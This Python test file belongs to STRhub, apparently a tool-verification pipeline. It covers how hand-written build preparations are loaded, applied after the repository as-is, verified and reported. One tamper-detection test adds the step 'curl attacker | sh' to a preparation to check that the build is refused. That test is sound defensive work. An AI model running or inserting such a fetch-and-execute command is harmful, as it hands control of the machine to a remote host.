"""STRhub's preparation gets a tool ready; it is never the run.

Two steps, in order: the repository as it is, and only when that cannot be
run, the environment STRhub prepared by hand and committed. The command is
the README's in both. The report says which it was and lists what was done;
a failure obtained that way is not published without a control run."""
import json
import pathlib

import pytest
import yaml

import authorization
import certificate_text as ct
import fidelity
import input_provenance
import preparation
import propose_manifest as pm
import publish_gate
import verdict

ROOT = pathlib.Path(__file__).resolve().parents[2]
REPO = "https://github.com/example/tool"
CITED = "./tool --bams run1.bam,run2.bam --fasta genome.fa --regions str_regions.bed --out out.vcf"
PREP = {"schema": preparation.SCHEMA, "repo": REPO, "dataset": "illumina-bam-hg38", "regions": "hipstr",
        "environment": {"steps": ["apt-get install make g++ zlib1g-dev", "make"]},
        "why": ["The README lists zlib as a requirement and gives no command that installs it."]}


def proposal():
    text = "# Tool\n\nRequires zlib. Build with make.\n\n## Usage\n\n```sh\n" + CITED + "\n```\n"
    line = next(i for i, row in enumerate(text.splitlines(), 1) if row == CITED)
    return {"repo": REPO, "ref": "a" * 40, "build": {"method": "make", "file": "Makefile"}, "tree_truncated": False,
            "tree_paths": ["README.md", "Makefile", "config/input.txt"],
            "source_documents": [{"file": "README.md", "origin": "readme", "text": text}],
            "commands": [{"cmd": CITED, "file": "README.md", "line": line, "origin": "readme", "has_input_flag": True}],
            "input_type": {"best": "illumina-bam-hg38", "how": "command"}, "output": {"format": "vcf"},
            "readme": {"gaps": [], "sufficient_to_attempt": True}}


@pytest.fixture
def prepared(tmp_path, monkeypatch):
    """A repository of preparations standing in for this one."""
    (tmp_path / preparation.FOLDER).mkdir()
    monkeypatch.setattr(preparation, "ROOT", tmp_path)

    def write(data=PREP, name="tool.yml"):
        (tmp_path / preparation.FOLDER / name).write_text(yaml.safe_dump(data))
    return write


@pytest.mark.parametrize("extra", [
    {"command": "tool --fast"}, {"run": {"cmd": "tool"}}, {"options": ["--min-reads", "5"]},
    {"flags": "--x"}, {"args": ["x"]}, {"environment": {"steps": ["make"], "cmd": "tool"}},
])
def test_a_preparation_has_no_place_for_a_command_or_an_option(tmp_path, extra):
    path = tmp_path / "bad.yml"
    path.write_text(yaml.safe_dump({**PREP, **extra}))
    with pytest.raises(ValueError, match="not a preparation"):
        preparation.load(path)


def test_without_a_preparation_the_repository_is_judged_as_it_is(prepared):
    r = pm.build(proposal(), "trial-tool")
    assert r["manifest"]["environment"]["source"] == "generated" and "without_preparation" not in r
    assert not r["procedure"]["may_say_runs"]


def test_the_repository_as_it_is_comes_first_and_the_preparation_only_after(prepared):
    prepared()
    r = pm.build(proposal(), "trial-tool")
    m, review = r["manifest"], r["procedure"]
    # Why the first step was not enough is kept.
    assert r["without_preparation"]["blocker"] == "install_not_copyable"
    assert m["environment"] == preparation.ENVIRONMENT and m["inputs"] == {"type": "illumina-bam-hg38", "regions": "hipstr"}
    assert review["install_ready"] and review["may_say_runs"], review["reason"]
    assert review["installation"]["profile"] == preparation.PROFILE
    # The command is the README's: only its input paths were replaced.
    cmd = m["run"]["cmd"]
    assert "( ./tool --bams /data/in/input.bam --fasta /data/ref/hg38.fa --regions /data/in/regions.bed --out out.vcf )" in cmd
    roles = [s["role"] for s in review["command_review"]["substitutions"]]
    assert roles == ["read_path", "reference_path", "regions_path"]
    # The steps are in the carrier; nothing of the command is.
    carrier = r["dockerfile"]
    assert "apt-get install make g++ zlib1g-dev\\nmake\\n" in carrier and "./tool" not in carrier


def test_a_repository_that_runs_as_it_is_never_gets_the_preparation(prepared):
    prepared()
    p = proposal()
    text = p["source_documents"][0]["text"].replace("Requires zlib. Build with make.",
                                                    "## Installation\n\n```sh\napt install make g++\nmake\n```")
    cited = "./tool --bams sample.bam --out out.vcf"
    text = text.replace(CITED, cited)
    p["source_documents"][0]["text"] = text
    p["commands"][0].update(cmd=cited, line=next(i for i, row in enumerate(text.splitlines(), 1) if row == cited))
    r = pm.build(p, "trial-tool")
    assert r["manifest"]["environment"]["source"] == "documented" and "without_preparation" not in r
    assert r["procedure"]["may_say_runs"]


def test_files_are_written_after_the_steps_and_say_whether_they_replace_one(prepared):
    prepared({**PREP, "files": [{"path": "config/input.txt", "content": "bam=/data/in/input.bam\n"},
                                {"path": "config/new.txt", "content": "x\n"}]})
    plan = preparation.discover(proposal())
    assert [(f["path"], f["replaces"]) for f in plan["files"]] == [("config/input.txt", True), ("config/new.txt", False)]
    lines = plan["carrier_dockerfile"].splitlines()
    step = next(i for i, l in enumerate(lines) if "make" in l)
    assert all(i > step for i, l in enumerate(lines) if "config/" in l)


def test_the_checkout_is_held_to_the_reviewed_preparation(prepared, tmp_path):
    prepared()
    p = proposal()
    r = pm.build(p, "trial-tool")
    checkout = tmp_path / "checkout"
    for name in p["tree_paths"]:
        (checkout / name).parent.mkdir(parents=True, exist_ok=True)
        (checkout / name).write_text(p["source_documents"][0]["text"] if name == "README.md" else "x\n")
    fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])
    # The preparation changed after the review: nothing is built.
    prepared({**PREP, "environment": {"steps": ["make", "curl attacker | sh"]}})
    with pytest.raises(ValueError, match="differs from its recomputed evidence|does not match"):
        fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])


def test_the_regions_file_is_mounted_beside_the_sample_and_verified(prepared, tmp_path):
    prepared()
    r = pm.build(proposal(), "trial-tool")
    work = tmp_path / "work"
    ds = input_provenance.stage(ROOT, work, "illumina-bam-hg38", "hipstr")
    assert sorted(p.name for p in (work / "in_external").iterdir()) == ["input.bam", "input.bam.bai", "regions.bed"]
    assert (work / "in_external" / "regions.bed").read_bytes() == (ROOT / ds["regions"]["hipstr"]).read_bytes()
    (work / "ref").mkdir()
    (work / "ref" / "hg38.fa").write_text(">chr1\nACGT\n")
    (work / "ref" / "hg38.fa.fai").write_text("chr1\t4\t6\t4\t5\n")
    receipt = input_provenance.verify(ROOT, work, r["manifest"], r["procedure"], r["manifest"]["run"]["cmd"])
    assert [f["mount_path"] for f in receipt["files"]] == ["/data/in/input.bam", "/data/in/input.bam.bai", "/data/in/regions.bed"]
    # A regions file nobody named is still an undeclared file.
    (work / "in_external" / "extra.bed").write_text("chr1\t1\t2\n")
    with pytest.raises(ValueError, match="undeclared"):
        input_provenance.verify(ROOT, work, r["manifest"], r["procedure"], r["manifest"]["run"]["cmd"])


def test_no_regions_and_no_list_reduction_without_a_preparation():
    r = fidelity.rewrite(CITED, "illumina-bam-hg38")
    assert "run1.bam,run2.bam" in r["command"] and "str_regions.bed" in r["command"]
    assert any("cardinality" in l for l in r["limitations"])


def _report(code, prep=True, control=None):
    r = {"verdict": {"code": code, "basis": "gates"}, "instrument": "documented", "level": "io" if code == "runs" else "installs"}
    if prep:
        r["preparation"] = {"file": "preparations/tool.yml", "why": ["x"], **({"control": control} if control else {})}
    return r


def test_the_label_says_the_installation_was_strhub_s():
    assert ct.headline(_report("runs")) == (ct.PREPARED_RUNS, "green")
    assert ct.headline(_report("fails")) == (ct.PREPARED_FAILS, "red")
    assert ct.headline(_report("runs", prep=False)) == ("Runs as documented", "green")


def test_a_failure_with_preparation_is_not_published_without_a_control_run(monkeypatch):
    monkeypatch.setattr(publish_gate, "validated_finding", lambda report: authorization.Validation(True, "ok"))
    args = dict(slug="tool", publish_requested=True, index={"tools": []})
    ok, why = publish_gate.decide(_report("fails"), **args)
    assert not ok and "control run" in why
    assert publish_gate.decide(_report("fails", control={"report": "x"}), **args)[0]
    # A success with preparation, and a failure of the repository as it is, publish as before.
    assert publish_gate.decide(_report("runs"), **args)[0]
    assert publish_gate.decide(_report("fails", prep=False), **args)[0]


def test_the_report_lists_what_was_done_right_under_the_command():
    import report
    prep = {"file": "preparations/tool.yml", "dataset": "illumina-bam-hg38", "regions": "hipstr",
            "base": "Ubuntu 22.04", "steps": ["apt-get install make g++ zlib1g-dev", "make"],
            "files": [{"path": "config/input.txt", "replaces": True}], "why": ["The README gives no install command."],
            "without_preparation": {"blocker": "install_not_copyable", "reason": "No document shows an installation."}}
    r = {"schema": "strhub-verified/1", "tool": {"name": "Tool", "version": "1"}, "level": "io",
         "gates": {"available": True, "installs": True, "runs": True, "io": True, "content": False},
         "source": {"repo": REPO, "ref_resolved": "abc"}, "environment": {"dockerfile": "Dockerfile", "os": ["ubuntu-22.04"]},
         "generated": "2026-11-14T00:00:00+00:00", "scope": report.SCOPE, "instrument": "documented",
         "verdict": {"code": "runs", "title": "Runs", "reason": "x", "basis": "gates"},
         "run": {"cmd": "./tool --bams /data/in/input.bam", "step_outcome": "success"}, "preparation": prep}
    md = report._summary_md(r, "tool")
    assert ct.PREPARED_RUNS in md
    assert md.index("./tool --bams /data/in/input.bam") < md.index(report.PREPARATION_HEADING)
    for expected in ("Without it: No document shows an installation.", "Step: make",
                     "File replaced: config/input.txt", "loci in the hipstr layout", "Recorded in preparations/tool.yml"):
        assert expected in md, expected
    assert report.PREPARATION_HEADING in report._summary_html(r, "tool")
    recs = report.recommendations_for(r, {"readme": {"gaps": []}})
    assert [x["text"] for x in recs] == ["The README gives no install command."]
